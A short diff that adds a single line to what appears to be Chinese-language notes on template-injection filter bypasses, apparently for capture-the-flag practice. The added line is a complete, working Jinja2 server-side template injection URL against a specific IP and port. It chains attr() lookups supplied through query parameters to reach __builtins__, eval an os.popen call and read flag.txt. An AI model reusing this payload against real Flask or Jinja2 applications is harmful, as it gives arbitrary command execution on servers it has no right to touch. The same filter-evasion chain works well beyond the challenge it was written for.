@@ -27,6 +27,8 @@ _ 可替换为 dir[0][0][0]
 
 ```
 
+http://152.136.210.141:21804/render?data={{request%7Cattr(request.args.get(%22a%22))%7Cattr(request.args.get(%22b%22))%7Cattr(request.args.get(%22c%22))%7Cattr(request.args.get(%22e%22))()%7Cattr(request.args.get(%22f%22))(476)%7Cattr(request.args.get(%22g%22))%7Cattr(request.args.get(%22h%22))%7Cattr(request.args.get(%22i%22))(request.args.get(%22j%22))%7Cattr(request.args.get(%22m%22))(request.args.get(%22n%22))(request.args.get(%22p%22))}}&a=__class__&b=__class__&c=__base__&e=__subclasses__&f=__getitem__&g=__init__&h=__globals__&i=__getitem__&j=__builtins__&m=__getitem__&n=eval&p=__import__(%22os%22).popen(%22cat%20flag.txt%22).read()
+
 
 ```python
 
